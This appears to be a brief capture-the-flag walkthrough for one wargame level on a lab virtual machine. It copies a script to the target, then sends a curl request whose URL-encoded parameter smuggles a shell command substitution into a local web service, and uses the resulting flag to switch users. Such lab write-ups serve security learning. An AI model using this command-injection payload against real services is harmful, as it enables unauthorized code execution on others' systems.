host:
- `scp -P 4242 SCRIPT level12@192.168.56.101:/tmp/SCRIPT`
- paste the previous flag as the password

ssh:
- `chmod 777 /tmp/SCRIPT`
- `curl "localhost:4646?x=%24%28%2F*%2FSCRIPT%29&y=yes"`
- `cat /tmp/flag13`, copy the flag
- `su level13`, paste the flag as the password